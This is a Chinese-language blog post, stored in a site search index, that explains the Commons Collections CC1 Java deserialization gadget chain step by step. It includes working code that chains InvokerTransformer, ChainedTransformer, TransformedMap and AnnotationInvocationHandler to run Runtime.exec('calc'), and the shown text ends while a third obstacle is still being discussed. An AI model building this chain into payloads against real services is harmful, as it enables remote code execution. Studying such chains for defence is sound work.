<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CC1链</title>
    <url>/2025/02/22/CC1%E9%93%BE/</url>
    <content><![CDATA[<h1 id="N9Uwl">CC1链</h1>
<h2 id="mj2qI">前置基础</h2>
**Java反序列化原理：**

<p>接受任意对象，执行readObject方法</p>
<ol>
<li>若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1</li>
<li>且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2</li>
<li>……</li>
<li>最后调用了危险方法（Runtime.getRuntime.exec()）</li>
</ol>
<p>最后调用危险方法有两种类型：</p>
<ol>
<li>不同类的同名函数</li>
<li>任意方法调用（反射&#x2F;动态加载恶意字节码）</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png"></p>
<p><strong>注意：</strong></p>
<p><strong>A ：可序列化</strong></p>
<p><strong>重写readObject</strong></p>
<p><strong>接受任意对象作为参数</strong></p>
<p><strong>On : 可序列化</strong></p>
<p><strong>集合类型&#x2F;接受Object&#x2F;接受Map</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png"></p>
<h2 id="lXwnL">CC1攻击链分析</h2>
Transformer接口

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Transformer是一个接口类，提供对象转换方法transform（接收对象，并对对象做出操作）</p>
<p>重要的实现方法有：</font><code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>invokerTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>ChainedTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>TransformedMap</code><font style="color:rgb(77, 77, 77);"></p>
<h3 id="KsDgt"><font style="color:rgb(77, 77, 77);">危险方法</font></h3>
<font style="color:rgb(77, 77, 77);">这里我们找到</font><font style="color:rgb(77, 77, 77);">InvokerTransformer类，该类中存在一个反射调用任意类，可以作为链子的终点</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是该类的<code>transform</code>方法，用反射获取方法并<code>invoke</code>执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用InvokerTransformer中可执行任意方法，下面是反射调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtime.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(rt,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>现在使用InvokerTransformer来调用calc</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(rt);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="M9rlJ">调用transform方法</h3>
在`TransformedMap`中的`checkSetValue`方法调用了`valueTransformer`的`transform`方法

<p>这里的valueTransformer在构造函数中初始化，但由于构造函数为protected属性，我们找到了本类中的decorate方法可以去构造一个TransformedMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Svlmc">调用checkSetValue</h3>
查找用法，只有`AbstractInputCheckedMapDecorator`中的内部类`MapEntry`的`setValue`可以调用`checkSetValue`方法（AbstractInputCheckedMapDecorator他是TransformedMap的父类）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>通过遍历MapEntry，调用entry的<code>setValue</code>方法即可调用危险方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        Class runtime = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(rt,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(rt);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我没有很是理解，借用别的师傅的笔记</p>
<blockquote>
<p>MapEntry中的setValue方法其实就是Entry中的setValue方法，他这里重写了setValue方法。</p>
<p>TransformedMap接受Map对象并且进行转换是需要遍历Map的,遍历出的一个键值对就是Entry，所以当遍历Map时，setValue方法也就执行了。</p>
</blockquote>
<h3 id="PXS5a">调用setValue</h3>
在该`AnnotationInvocationHandler`的`readObject`方法中，存在遍历Map并且调用`setValue`，所以该类可以作为我们的入口类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>AnnotationInvocationHandler</code>并不是一个puclic类型的类，如果想要调用它的话，需要通过反射的方法来获取其构造函数进行实例化。</p>
<p>观察构造方法，第一个参数要传入一个注解类，第二个参数就要传入我们构造的恶意Map了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable </span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>目前来说，不出意外的话，这个链子已经走完了，但是意外来的很快，我们发现其并没有成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        Class runtime = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(rt,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        for (Map.Entry entry:transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(rt);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="IHp1B">最后调整</h2>
**这条链子没有走下来有几个原因**

<h3 id="AGS9S">一）Runtime类没有继承序列化接口</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span></span><br></pre></td></tr></table></figure>

<p>没有继承序列化接口就不能被序列化，但是我们可以通过反射来调用，我们先看看普通反射怎么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Method</span> getRuntimeMethod = c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在我们来把他改成一个InvokerTransformer的形式，但是如此来说就有点繁琐了，需要一直调用transform。</p>
<p>记得有一个ChainedTransformer类，传入一个transform数组，进行递归调用（前一个transform的返回值作为后一个transform的参数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>

<p>这里是ChainedTransformer类的部分源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ChainedTransformer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">ChainedTransformer</span><span class="params">(<span class="keyword">final</span> <span class="type">boolean</span> clone, <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? extends T&gt;[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = clone ? FunctorUtils.copy(transformers) : transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; iTransformer : iTransformers) &#123;</span><br><span class="line">            object = iTransformer.transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据ChainedTransformer修改后，可成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="r10Sr">二）中间由于存在if判断，并没有进入到if中</h3>
通过动态调试，发现在readObject方法中if判断时，memberType为空，而没有进入到if中

<p>这里的name是get到我们之前Map中put进去键值对的<strong>key</strong>，然后去检查这个注解类中有没有这个<strong>key</strong>名字的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734604811567-b5fdc36b-d58b-4b4f-a1d5-3d4ce8164310.png"></p>
<p>因此我们修改一下，在Target注解中存在一个value的参数，在Target注解中存在value名字的参数，只需要把put进去的key改为<strong>value</strong>，将Overide注解的类换为Target注解类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610450476-054512e5-220d-4d72-bcef-f81b7a37dda6.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到已经memberType已经不为<strong>NULL</strong>了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610666424-0099b192-4b06-4e57-9f0f-7504adb1210a.png"></p>
<h3 id="dhqWm">三）readObject调用的setValue的参数值是固定的</h3>
我们的本意是将setValue中的值改为Runtime.class，但是实际上我们无法修改其中的值，若我们可以控制，这条链就成功走通了

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611334368-9c073e9c-2fb0-48e3-bb5c-3dacd4b478a8.png"></p>
